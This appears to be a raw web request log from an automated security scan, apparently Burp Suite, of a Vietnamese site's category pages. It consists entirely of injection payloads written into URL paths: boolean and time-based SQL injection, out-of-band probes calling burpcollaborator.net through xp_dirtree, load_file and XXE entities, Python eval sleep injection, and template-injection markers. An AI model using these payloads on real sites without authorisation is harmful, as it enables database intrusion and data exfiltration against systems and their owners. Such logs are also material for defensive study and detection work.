GET /index.php/category/thong-bao99330277'%20or%20'7929'%3d'7934/ ,1
GET /index.php/category/thong-bao/tb-hoc-bong'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cxop1bk1ynwlm6f6s0ig34ush58b0e42vtjq6gu5.burpcollab'%2b'orator.net%5ciro'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/ ,1
GET /index.php/category/thong-bao/(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20phoce%20SYSTEM%20%22http%3a//cjzg6zwdibg11u17vxbiz9nw0n6fa5y8m59vxk.burpcollab'%7c%7c'orator.net/%22%3e%25phoce%3b]%3e')%2c'/l')%20from%20dual)/ ,1
GET /index.php/category/tin-tuc/tt-dao-tao'%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20gvtxl%20SYSTEM%20%22http%3a//d7lhu0ke6c42pvp8jyzjnabxoougy9mdaax0lp.burpcollab'%7c%7c'orator.net/%22%3e%25gvtxl%3b]%3e')%2c'/l')%20from%20dual)%7c%7c'/ ,1
GET /index.php/category/tin-tuc/tt-nckh%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cpvotic8quosed7dk7anvbmz9c0ismoaf03xqnec.burpcollab'%2b'orator.net%5cele'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/ ,1
GET /index.php/category/thong-tin-chung/quy-trinh'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c3ei71qr4d2bswlwyqo69u0inve165xtokchz7nw.burpcollab'%2b'orator.net%5clqj'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/ ,1
GET /index.php/category/tin-tuc/tt-doan-hoi%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c6dka0tq7c5avvov1pr5ct3hquh0943suiif55tu.burpcollab'%2b'orator.net%5chjw'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/ ,1
GET /index.php/category/thong-bao/tb-khac'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c8qzcdv39p7nx8q832tie65us7jdbgg47vvsii67.burpcollab'%2b'orator.net%5czrn'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/ ,1
GET /index.php/category/tin-tuc)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cmyoql9bnxlvbg4gha7qsej26fxlpphd85w2js7h.burpcollab'%2b'orator.net%5cryj'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/ ,1
GET /index.php/category/thong-bao42558000'%20or%205634%3d5634--%20/ ,1
GET /index.php/category/thong-bao/tb-hoc-bong)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cdfwh20seecc2xvx8ry7jvajxwo2g5ktblzim8ax.burpcollab'%2b'orator.net%5crvt'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/ ,1
GET /index.php/category/thong-bao/tb-nckh'%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20phoce%20SYSTEM%20%22http%3a//ni9r5avohmfc050iu8atykm7zy5q9gxklh87ww.burpcollab'%7c%7c'orator.net/%22%3e%25phoce%3b]%3e')%2c'/l')%20from%20dual)%7c%7c'/ ,1
GET /index.php/category/tin-tuc/tt-nckh'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cadre0xqbc9azvsv5pv5gt7huul0d49s0jogb6zv.burpcollab'%2b'orator.net%5cfip'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/ ,1
GET /index.php/category/tin-tuc/tt-dao-tao%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c96ddtwja583yoro4iuyfm6atnktcx5lwbk87yvn.burpcollab'%2b'orator.net%5ciwz'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/ ,1
GET /index.php/category/thong-bao/tb-khac)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cvonzbi1wnulk6d6q0gg14ssf56bye32uuir5ht6.burpcollab'%2b'orator.net%5cfcy'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/ ,1
GET /index.php/category/thong-tin-chung/quy-trinh)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5czhk34mu0gyeozhzutk95xwljya428twko8lvbj0.burpcollab'%2b'orator.net%5clml'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/ ,1
GET /index.php/category/tin-tuc/tt-doan-hoi'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5chzklm4ciygw6hzhcb2rnfe31gsmkqee55t2gs4h.burpcollab'%2b'orator.net%5cqwc'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/ ,1
GET /index.php/category/thong-bao/tb-dao-tao'%20waitfor%20delay'0%3a0%3a20'--/ ,1
GET /index.php/category/tin-tuc')%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c3x17kqa4w2usflfy9op9d01neek6oycp5d20soh.burpcollab'%2b'orator.net%5cshn'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/ ,1
GET /index.php/category/thong-bao/tb-hoc-bong')%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cc7kguzkd6b41pup7jxzin9bwonufxjlaeybl19q.burpcollab'%2b'orator.net%5cwea'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/ ,1
GET /index.php/category/thong-bao77083304'%20or%203145%3d3146--%20/ ,1
GET /index.php/category/tin-tuc/tt-nckh)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5clj8p68wmikga131gv6brzin50w6oakybqznmda2.burpcollab'%2b'orator.net%5ckxz'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/ ,1
GET /index.php/category/thong-bao/tb-nckh%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c1pr5co22o0mq7j7w1mh75ytl6cc4gu4lu9rwhk6.burpcollab'%2b'orator.net%5ctck'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/ ,1
GET /index.php/category/tin-tuc/tt-dao-tao'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c4sx8fr55r3ptamaz4pka81wo9ff7j07ryfv2lqa.burpcollab'%2b'orator.net%5crzb'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/ ,1
GET /index.php/category/tin-tuc/(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20uzevp%20SYSTEM%20%22http%3a//rd8v0eqscqagv9vmpc5xtohbu20u4pssgp3fr4.burpcollab'%7c%7c'orator.net/%22%3e%25uzevp%3b]%3e')%2c'/l')%20from%20dual)/ ,1
GET /index.php/category/thong-bao/tb-khac')%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c7x5bkua8w6uwfpf29spdd41reikanfb64u1hr5g.burpcollab'%2b'orator.net%5cybi'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/ ,1
GET /index.php/category/tin-tuc/tt-doan-hoi)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cjaxnx6nk9i78s1sem42pqge3ruxm1gp7hvei46t.burpcollab'%2b'orator.net%5czwb'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/ ,1
GET /index.php/category/thong-tin-chung/quy-trinh')%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5co5ussbip4n2dn6njh9xull98mzsrwik9dxak08p.burpcollab'%2b'orator.net%5crsa'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/ ,1
GET /index.php/category/thong-bao/tb-dao-tao')waitfor%20delay'0%3a0%3a20'--/ ,1
GET /index.php/category/(select%20load_file('%5c%5c%5c%5cvhgz4iuwguekzdzqtg91xslfy64y8qwhy5vslga.burpcollaborator.net%5c%5czdq'))/ ,1
GET /index.php/category/thong-bao'%20and%20'2937'%3d'2937/ ,1
GET /index.php/category/thong-bao/(select%20load_file('%5c%5c%5c%5cxno1ak0ymwkm5f5szif33urh48a0d41v3j06quf.burpcollaborator.net%5c%5czcn'))/ ,1
GET /index.php/category/thong-bao/tb-nckh'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cnwnrja9ovmtce5ei88otck07dyjqngb72vzip6e.burpcollab'%2b'orator.net%5cldm'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/ ,1
GET /index.php/category/tin-tuc/tt-nckh')%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5ca0benxdbz9xzisi5cvsgg74uhlndr9f08o5bvzk.burpcollab'%2b'orator.net%5coge'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/ ,1
GET /index.php/category/tin-tuc/tt-dao-tao)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5co8xsvblp7n5dq6qjk90uolc8pzvrzknbfzcm2ar.burpcollab'%2b'orator.net%5cejh'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/ ,1
GET /index.php/category/thong-bao/(select%20load_file('%5c%5c%5c%5c3jn76qw4i2gs1l1yvob9z0nn0e669bx2zqwdm1b.burpcollaborator.net%5c%5cayq'))/ ,1
GET /index.php/category/tin-tuc/tt-hop-tac'%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20uzevp%20SYSTEM%20%22http%3a//pe7t1crqdobew7wkqa6vumi9v01s5ntrho4es3.burpcollab'%7c%7c'orator.net/%22%3e%25uzevp%3b]%3e')%2c'/l')%20from%20dual)%7c%7c'/ ,1
GET /index.php/category/thong-tin-chung/(select%20load_file('%5c%5c%5c%5cirdme54jqho7909d33jo7fv28telic638r5ev2k.burpcollaborator.net%5c%5ccjk'))/ ,1
GET /index.php/category/tin-tuc/tt-doan-hoi')%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c9w6djw9av8tyere48uofc60tdkjcn6bx4l18rwg.burpcollab'%2b'orator.net%5cens'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/ ,1
GET /index.php/category/thong-bao'%20and%20'5423'%3d'5432/ ,1
GET /index.php/category/thong-bao/tb-hoc-bong'%2b(select%20load_file('%5c%5c%5c%5c0ab4xnn19z7psisvml26qxekrbx307oyrmo9ex3.burpcollaborator.net%5c%5ckom'))%2b'/ ,1
GET /index.php/category/tin-tuc'%2b(select%20load_file('%5c%5c%5c%5cidzm05qjcha7v0vdp35otfh2ut0l4ds4vssfi37.burpcollaborator.net%5c%5cwaf'))%2b'/ ,1
GET /index.php/category/thong-bao/tb-dao-tao'%2c0)waitfor%20delay'0%3a0%3a20'--/ ,1
GET /index.php/category/thong-bao/tb-nckh)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5czlo38my0kyio3h3uxkd51wpj2a82cs0js7pufi4.burpcollab'%2b'orator.net%5ceer'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/ ,1
GET /index.php/category/tin-tuc/(select%20load_file('%5c%5c%5c%5cgfzk23shefc5xyxbr17mvdj0wr2j6fu6wuthj58.burpcollaborator.net%5c%5cqax'))/ ,1
GET /index.php/category/thong-bao/tb-khac'%2b(select%20load_file('%5c%5c%5c%5cg9qkw3mh8f65ryrbl11mpdd0qrwjzonfq3nqde2.burpcollaborator.net%5c%5cplr'))%2b'/ ,1
GET /index.php/category/tin-tuc/tt-dao-tao')%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5crpkvce2soqmg797m1chx5otb62cugn4ex2upkd9.burpcollab'%2b'orator.net%5cvhg'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/ ,1
GET /index.php/category/tin-tuc/(select%20load_file('%5c%5c%5c%5ck6rot7jl5j39o2ofi5yqmha4nvtnxhl8nwkja7z.burpcollaborator.net%5c%5cvlq'))/ ,1
GET /index.php/category/thong-tin-chung/quy-trinh'%2b(select%20load_file('%5c%5c%5c%5ckbzoy7olaj89t2tfn53qrhf4svyn2eq5ttqgg45.burpcollaborator.net%5c%5cywj'))%2b'/ ,1
GET /index.php/category/tin-tuc/tt-hop-tac%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c0st4fn51rzppaiav4lk68xwk9bf3jy7pxdu0ko9.burpcollab'%2b'orator.net%5cljq'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/ ,1
GET /index.php/category/thong-bao/tb-hoc-bong'/ ,1
GET /index.php/category/tin-tuc'/ ,1
GET /index.php/category/thong-bao'%20and%205688%3d5688--%20/ ,1
GET /index.php/category/thong-bao/tb-dao-tao27625721'%20or%20'3645'%3d'3645/ ,1
GET /index.php/category/thong-bao/tb-khac'/ ,1
GET /index.php/category/tin-tuc/tt-nckh'%2b(select%20load_file('%5c%5c%5c%5cnpgrca2oommc757i18ht5kt76ycqgm4d714oucj.burpcollaborator.net%5c%5cthx'))%2b'/ ,1
GET /index.php/category/thong-bao/tb-nckh')%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c1df50oq2c0aqvjvwpm57tyhluc044usll9iw8kx.burpcollab'%2b'orator.net%5cttu'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/ ,1
GET /index.php/category/tin-tuc/tt-hop-tac'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cvrqzei4wquok9d9q3gj17svf86eyit6kx8uvkj9.burpcollab'%2b'orator.net%5cqix'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/ ,1
GET /index.php/category/tin-tuc/tt-doan-hoi'%2b(select%20load_file('%5c%5c%5c%5cof7s2bspencdx6xjr97uvlj8wz2r6lucx0unkb9.burpcollaborator.net%5c%5cqtv'))%2b'/ ,1
GET /index.php/category/tin-tuc/(select%20load_file('%5c%5c%5c%5cyce2zlpzbx9nugutoj44svgit9z13urlt9qwgk5.burpcollaborator.net%5c%5cxwy'))/ ,1
GET /index.php/category/thong-tin-chung/quy-trinh'/ ,1
GET /index.php/category/thong-bao'%20and%208079%3d8081--%20/ ,1
GET /index.php/category/tin-tuc'(select*from(select(sleep(20)))a)'/ ,1
GET /index.php/category/thong-bao/tb-hoc-bong'(select*from(select(sleep(20)))a)'/ ,1
GET /index.php/category/thong-bao/tb-dao-tao53365688'%20or%20'5584'%3d'5585/ ,1
GET /index.php/category/thong-bao/tb-khac'(select*from(select(sleep(20)))a)'/ ,1
GET /index.php/category/tin-tuc/tt-nckh'/ ,1
GET /index.php/category/thong-bao/(select%20load_file('%5c%5c%5c%5cr6yvtejs5q3go9omicyxmoabn2tuxklbnzkmaaz.burpcollaborator.net%5c%5cmhh'))/ ,1
GET /index.php/category/tin-tuc/tt-doan-hoi'/ ,1
GET /index.php/category/tin-tuc/tt-hop-tac)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c0ef41nr1dzbpwiwvql66uxikvb135ytpldi08ox.burpcollab'%2b'orator.net%5czst'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/ ,1
GET /index.php/category/thong-tin-chung/quy-trinh'(select*from(select(sleep(20)))a)'/ ,1
GET /index.php/category/tin-tuc/tt-dao-tao'%2b(select%20load_file('%5c%5c%5c%5ctdax0gqucsaivbvope5ztqhdu40w4psgv4srif7.burpcollaborator.net%5c%5cppt'))%2b'/ ,1
GET /index.php/category/tin-tuc'%2b(select*from(select(sleep(20)))a)%2b'/ ,1
GET /index.php/category/tin-tuc/tt-nckh'(select*from(select(sleep(20)))a)'/ ,1
GET /index.php/category/thong-bao/tb-hoc-bong'%2b(select*from(select(sleep(20)))a)%2b'/ ,1
GET /index.php/category/thong-bao/tb-dao-tao54449973'%20or%203469%3d3469--%20/ ,1
GET /index.php/category/thong-bao/tb-khac'%2b(select*from(select(sleep(20)))a)%2b'/ ,1
GET /index.php/category/thong-bao/tb-nckh'%2b(select%20load_file('%5c%5c%5c%5cwii05jvxhvfl0e0ruha2ytmgz75z9pxg04xrnfc.burpcollaborator.net%5c%5clpy'))%2b'/ ,1
GET /index.php/category/tin-tuc/tt-hop-tac')%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5czsv3fm50rypoahau4kk58wwj9af2jx7o0cxznnc.burpcollab'%2b'orator.net%5cnfp'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/ ,1
GET /index.php/category/tin-tuc/tt-doan-hoi'(select*from(select(sleep(20)))a)'/ ,1
GET /index.php/category/thong-tin-chung/quy-trinh'%2b(select*from(select(sleep(20)))a)%2b'/ ,1
GET /index.php/category/tin-tuc/tt-dao-tao'/ ,1
GET /index.php/category/tin-tuc/tt-nckh'%2b(select*from(select(sleep(20)))a)%2b'/ ,1
GET /index.php/category/thong-bao/tb-dao-tao20594201'%20or%209633%3d9637--%20/ ,1
GET /index.php/category/tin-tuc'%20and%20(select*from(select(sleep(20)))a)--%20/ ,1
GET /index.php/category/thong-bao/tb-hoc-bong'%20and%20(select*from(select(sleep(20)))a)--%20/ ,1
GET /index.php/category/thong-bao/tb-nckh'/ ,1
GET /index.php/category/thong-bao/tb-khac'%20and%20(select*from(select(sleep(20)))a)--%20/ ,1
GET /index.php/category/tin-tuc/(select%20load_file('%5c%5c%5c%5cva9zxinw9u7ksdsqmg21qsefr6xy1tpkr8ovej3.burpcollaborator.net%5c%5cavq'))/ ,1
GET /index.php/category/tin-tuc/tt-doan-hoi'%2b(select*from(select(sleep(20)))a)%2b'/ ,1
GET /index.php/category/tin-tuc/tt-dao-tao'(select*from(select(sleep(20)))a)'/ ,1
GET /index.php/category/thong-tin-chung/quy-trinh'%20and%20(select*from(select(sleep(20)))a)--%20/ ,1
GET /index.php/category/thong-bao/tb-dao-tao'%20and%20'6151'%3d'6151/ ,1
GET /index.php/category/tin-tuc/tt-nckh'%20and%20(select*from(select(sleep(20)))a)--%20/ ,1
GET /index.php/category/thong-bao/tb-nckh'(select*from(select(sleep(20)))a)'/ ,1
GET /index.php/category/tin-tuc/tt-doan-hoi'%20and%20(select*from(select(sleep(20)))a)--%20/ ,1
GET /index.php/category/tin-tuc/tt-dao-tao'%2b(select*from(select(sleep(20)))a)%2b'/ ,1
GET /index.php/category/tin-tuc/tt-hop-tac'%2b(select%20load_file('%5c%5c%5c%5czfi32ms0eycoxhxurk75vwjjwa226xuoxcuzkn9.burpcollaborator.net%5c%5cvlk'))%2b'/ ,1
GET /index.php/category/thong-bao%7d%7dug050'/%22%3ctorq1/ ,1
GET /index.php/category/thong-bao/tb-dao-tao'%20and%20'2731'%3d'2732/ ,1
GET /index.php/category/thong-bao/tb-hoc-bong'%20waitfor%20delay'0%3a0%3a20'--/ ,1
GET /index.php/category/tin-tuc'%20waitfor%20delay'0%3a0%3a20'--/ ,1
GET /index.php/category/thong-bao/tb-khac'%20waitfor%20delay'0%3a0%3a20'--/ ,1
GET /index.php/category/thong-bao/tb-nckh'%2b(select*from(select(sleep(20)))a)%2b'/ ,1
GET /index.php/category/tin-tuc/tt-hop-tac'/ ,1
GET /index.php/category/thong-tin-chung/quy-trinh'%20waitfor%20delay'0%3a0%3a20'--/ ,1
GET /index.php/category/tin-tuc/tt-dao-tao'%20and%20(select*from(select(sleep(20)))a)--%20/ ,1
GET /index.php/category/thong-bao%25%7dezw4l'/%22%3cx3mvf/ ,1
GET /index.php/category/thong-bao/tb-dao-tao'%20and%207949%3d7949--%20/ ,1
GET /index.php/category/thong-bao/tb-hoc-bong')waitfor%20delay'0%3a0%3a20'--/ ,1
GET /index.php/category/tin-tuc/tt-nckh'%20waitfor%20delay'0%3a0%3a20'--/ ,1
GET /index.php/category/tin-tuc')waitfor%20delay'0%3a0%3a20'--/ ,1
GET /index.php/category/thong-bao/tb-khac')waitfor%20delay'0%3a0%3a20'--/ ,1
GET /index.php/category/tin-tuc/tt-hop-tac'(select*from(select(sleep(20)))a)'/ ,1
GET /index.php/category/thong-bao/tb-nckh'%20and%20(select*from(select(sleep(20)))a)--%20/ ,1
GET /index.php/category/tin-tuc/tt-doan-hoi'%20waitfor%20delay'0%3a0%3a20'--/ ,1
GET /index.php/category/thong-tin-chung/quy-trinh')waitfor%20delay'0%3a0%3a20'--/ ,1
GET /index.php/category/thong-baooan4a%25%3emq5up'/%22%3cmxkp6/ ,1
GET /index.php/category/thong-bao/tb-dao-tao'%20and%202432%3d2438--%20/ ,1
GET /index.php/category/tin-tuc/tt-nckh')waitfor%20delay'0%3a0%3a20'--/ ,1
GET /index.php/category/tin-tuc'%2c0)waitfor%20delay'0%3a0%3a20'--/ ,1
GET /index.php/category/thong-bao/tb-hoc-bong'%2c0)waitfor%20delay'0%3a0%3a20'--/ ,1
GET /index.php/category/tin-tuc/tt-doan-hoi')waitfor%20delay'0%3a0%3a20'--/ ,1
GET /index.php/category/thong-bao/tb-khac'%2c0)waitfor%20delay'0%3a0%3a20'--/ ,1
GET /index.php/category/thong-tin-chung/quy-trinh'%2c0)waitfor%20delay'0%3a0%3a20'--/ ,1
GET /index.php/category/tin-tuc/tt-hop-tac'%2b(select*from(select(sleep(20)))a)%2b'/ ,1
GET /index.php/category/tin-tuc/tt-dao-tao'%20waitfor%20delay'0%3a0%3a20'--/ ,1
GET /index.php/category/tin-tuc/tt-nckh'%2c0)waitfor%20delay'0%3a0%3a20'--/ ,1
GET /index.php/category/thong-bao'%2bsleep(20.to_i)%2b'/ ,1
GET /index.php/category/thong-bao/tb-hoc-bong96560236'%20or%20'3450'%3d'3450/ ,1
GET /index.php/category/thong-bao/tb-nckh'%20waitfor%20delay'0%3a0%3a20'--/ ,1
GET /index.php/category/tin-tuc91931888'%20or%20'5045'%3d'5045/ ,1
GET /index.php/category/tin-tuc/tt-doan-hoi'%2c0)waitfor%20delay'0%3a0%3a20'--/ ,1
GET /index.php/category/thong-bao/tb-khac45944620'%20or%20'4847'%3d'4847/ ,1
GET /index.php/category/thong-tin-chung/quy-trinh41325794'%20or%20'1570'%3d'1570/ ,1
GET /index.php/category/tin-tuc/tt-hop-tac'%20and%20(select*from(select(sleep(20)))a)--%20/ ,1
GET /index.php/category/tin-tuc/tt-dao-tao')waitfor%20delay'0%3a0%3a20'--/ ,1
GET /index.php/category/thong-bao'%2beval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))%2b'/ ,1
GET /index.php/category/tin-tuc/tt-nckh28243976'%20or%20'1555'%3d'1555/ ,1
GET /index.php/category/thong-bao/tb-hoc-bong18543107'%20or%20'9933'%3d'9939/ ,1
GET /index.php/category/thong-bao/tb-nckh')waitfor%20delay'0%3a0%3a20'--/ ,1
GET /index.php/category/tin-tuc48289740'%20or%20'4162'%3d'4171/ ,1
GET /index.php/category/tin-tuc/tt-doan-hoi51375347'%20or%20'6071'%3d'6071/ ,1
GET /index.php/category/thong-tin-chung/quy-trinh34343120'%20or%20'7808'%3d'7813/ ,1
GET /index.php/category/thong-bao/tb-khac80018297'%20or%20'6419'%3d'6428/ ,1
GET /index.php/category/tin-tuc/tt-dao-tao'%2c0)waitfor%20delay'0%3a0%3a20'--/ ,1
GET /index.php/category/thong-bao/tb-hoc-bong96503255'%20or%203544%3d3544--%20/ ,1
GET /index.php/category/tin-tuc/tt-nckh65110681'%20or%20'2257'%3d'2260/ ,1
GET /index.php/category/eval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))/ ,1
GET /index.php/category/thong-bao/tb-nckh'%2c0)waitfor%20delay'0%3a0%3a20'--/ ,1
GET /index.php/category/tin-tuc/tt-doan-hoi15648404'%20or%20'1896'%3d'1903/ ,1
GET /index.php/category/tin-tuc23252909'%20or%206788%3d6788--%20/ ,1
GET /index.php/category/tin-tuc/tt-dao-tao99094791'%20or%20'4204'%3d'4204/ ,1
GET /index.php/category/thong-tin-chung/quy-trinh78426762'%20or%205865%3d5865--%20/ ,1
GET /index.php/category/thong-bao/tb-khac34328876'%20or%206027%3d6027--%20/ ,1
GET /index.php/category/tin-tuc/tt-hop-tac'%20waitfor%20delay'0%3a0%3a20'--/ ,1
GET /index.php/category/thong-bao/tb-dao-tao%7d%7da8hoh'/%22%3ch6e3m/ ,1
GET /index.php/category/thong-bao/tb-hoc-bong48266038'%20or%206414%3d6417--%20/ ,1
GET /index.php/category/thong-bao'.sleep(20).'/ ,1
GET /index.php/category/tin-tuc/tt-nckh47138749'%20or%205045%3d5045--%20/ ,1
GET /index.php/category/thong-bao/tb-nckh10524294'%20or%20'8800'%3d'8800/ ,1
GET /index.php/category/tin-tuc54376000'%20or%205876%3d5883--%20/ ,1
GET /index.php/category/thong-tin-chung/quy-trinh76876507'%20or%205538%3d5539--%20/ ,1
GET /index.php/category/tin-tuc/tt-doan-hoi40300784'%20or%208232%3d8232--%20/ ,1
GET /index.php/category/tin-tuc/tt-dao-tao43195442'%20or%20'8137'%3d'8146/ ,1
GET /index.php/category/thong-bao/tb-khac95438215'%20or%207020%3d7026--%20/ ,1
GET /index.php/category/tin-tuc/tt-hop-tac')waitfor%20delay'0%3a0%3a20'--/ ,1
GET /index.php/category/thong-bao/tb-dao-tao%25%7dccp8y'/%22%3cb39rx/ ,1
GET /index.php/category/thong-bao/tb-hoc-bong'%20and%20'8207'%3d'8207/ ,1
GET /index.php/category/tin-tuc/tt-nckh95597698'%20or%205719%3d5723--%20/ ,1
GET /index.php/category/tin-tuc'%20and%20'8143'%3d'8143/ ,1
GET /index.php/category/thong-bao/tb-nckh88721747'%20or%20'3915'%3d'3919/ ,1
GET /index.php/category/tin-tuc/tt-doan-hoi61483126'%20or%206760%3d6762--%20/ ,1
GET /index.php/category/thong-tin-chung/quy-trinh'%20and%20'2758'%3d'2758/ ,1
GET /index.php/category/thong-bao/tb-khac'%20and%20'2745'%3d'2745/ ,1
GET /index.php/category/tin-tuc/tt-dao-tao24949172'%20or%209963%3d9963--%20/ ,1
GET /index.php/category/thong-bao/tb-dao-taom2xsy%25%3enthis'/%22%3ctjoes/ ,1
GET /index.php/category/tin-tuc/tt-hop-tac'%2c0)waitfor%20delay'0%3a0%3a20'--/ ,1
GET /index.php/category/thong-bao/tb-hoc-bong'%20and%20'7475'%3d'7482/ ,1
GET /index.php/category/tin-tuc/tt-nckh'%20and%20'4250'%3d'4250/ ,1
GET /index.php/category/tin-tuc'%20and%20'6751'%3d'6756/ ,1
GET /index.php/category/thong-bao/tb-nckh19735690'%20or%201332%3d1332--%20/ ,1
GET /index.php/category/tin-tuc/tt-doan-hoi'%20and%20'4218'%3d'4218/ ,1
GET /index.php/category/thong-tin-chung/quy-trinh'%20and%20'5092'%3d'5095/ ,1
GET /index.php/category/tin-tuc/tt-dao-tao72950104'%20or%208919%3d8926--%20/ ,1
GET /index.php/category/thong-bao/tb-dao-tao'%2bsleep(20.to_i)%2b'/ ,1
GET /index.php/category/thong-bao/tb-khac'%20and%20'9973'%3d'9981/ ,1
GET /index.php/category/thong-bao/tb-hoc-bong'%20and%207755%3d7755--%20/ ,1
GET /index.php/category/tin-tuc/tt-hop-tac68477606'%20or%20'6562'%3d'6562/ ,1
